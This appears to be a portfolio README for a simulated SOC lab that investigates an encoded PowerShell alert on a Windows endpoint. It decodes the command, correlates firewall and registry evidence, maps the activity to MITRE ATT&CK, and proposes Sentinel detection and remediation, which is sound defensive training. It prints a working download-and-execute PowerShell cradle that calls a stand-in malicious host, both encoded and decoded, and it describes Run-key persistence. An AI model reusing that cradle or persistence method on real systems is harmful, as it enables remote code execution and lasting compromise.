# Windows Endpoint PowerShell Compromise Investigation Lab

## Overview

This project simulates a real-world SOC investigation into suspicious PowerShell activity on a Windows 10 endpoint.

The objective was to:

- Determine whether activity was malicious
- Decode and analyze the executed command
- Identify persistence mechanisms
- Correlate process and network telemetry
- Map activity to MITRE ATT&CK
- Propose detection and remediation actions

This lab reflects a realistic Tier 1 to Tier 2 SOC escalation case.

---

## Scenario

A high severity alert was triggered due to PowerShell executing with:

- Encoded command (-enc)
- ExecutionPolicy Bypass
- Subsequent outbound network activity

This combination is frequently associated with malware loaders and initial access activity.

---

## Initial Alert Details

**Event ID:** 4688  
**New Process:** powershell.exe  
**Parent Process:** explorer.exe  
**Command Line:**

powershell.exe -NoProfile -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAtAHMAaQB0AGUALgBjAG8AbQAvAHAAaABwAC4AZQB4AGUAIgApAA==

Encoded PowerShell combined with ExecutionPolicy Bypass is a strong indicator of malicious execution.

---

## Investigation Steps

### 1. Command Decoding

The Base64 payload decoded to:

IEX (New-Object Net.WebClient).DownloadString("http://malicious-site.com/php.exe")

This confirms an attempt to download and execute a remote payload.

---

### 2. Network Activity Correlation

Firewall logs showed:

- Destination IP: 185.234.219.12
- Port: 80
- Domain: malicious-site.com

This occurred within seconds of PowerShell execution.

This behavior is consistent with tool transfer or command and control activity.

---

### 3. Persistence Check

Registry modification observed:

HKCU\Software\Microsoft\Windows\CurrentVersion\Run  
Value Name: Updater  
Data: C:\Users\Public\php.exe  

This confirms persistence via Registry Run key.

---

### 4. Process Tree Analysis

Process chain:

explorer.exe  
└── powershell.exe  
  └── php.exe  

This confirms payload execution following script download.

---

## MITRE ATT&CK Mapping

- T1059.001 – Command and Scripting Interpreter: PowerShell
- T1105 – Ingress Tool Transfer
- T1547.001 – Registry Run Keys / Startup Folder

---

## Findings

- Malicious PowerShell execution confirmed
- Remote payload successfully downloaded
- Persistence mechanism established
- Outbound communication to suspicious host detected

This activity chain is consistent with initial compromise followed by persistence establishment.

---

## Risk Assessment

**Severity:** Critical  

**Justification:**

- Encoded command execution
- ExecutionPolicy bypass
- External payload retrieval
- Registry persistence
- Potential for lateral movement

---

## False Positive Considerations

- Administrative automation using encoded PowerShell
- Software installation scripts
- Legitimate remote management tools

However, correlation of encoded execution, external download, and persistence significantly reduces likelihood of benign activity.

---

## Detection Logic Proposal

Alert when:

- Event ID = 4688
- Process Name = powershell.exe
- CommandLine contains "-enc"
- CommandLine contains "ExecutionPolicy Bypass"

Increase severity if outbound connection occurs within 60 seconds.

### Example KQL (Microsoft Sentinel)

SecurityEvent
| where EventID == 4688
| where Process has "powershell"
| where CommandLine contains "-enc"
| where CommandLine contains "ExecutionPolicy Bypass"

---

## Remediation Recommendations

- Isolate affected host
- Remove malicious Run key
- Delete payload from Public directory
- Block malicious domain and IP
- Reset user credentials
- Conduct environment-wide threat hunt

---

## Evidence Included

- event_logs_sample.txt
- registry_artifacts.txt
- process_tree.png
- incident_report.md

---

## Skills Demonstrated

- Windows Event Log analysis
- PowerShell threat investigation
- Encoded payload decoding
- Persistence detection
- MITRE ATT&CK mapping
- Incident documentation
- Microsoft Sentinel detection logic
- Threat hunting methodology

---

## Analyst Conclusion

While PowerShell is a legitimate administrative tool, the combination of encoded command execution, policy bypass, external payload download, and registry persistence strongly indicates malicious compromise.

This case would be escalated and treated as a confirmed incident requiring immediate containment.
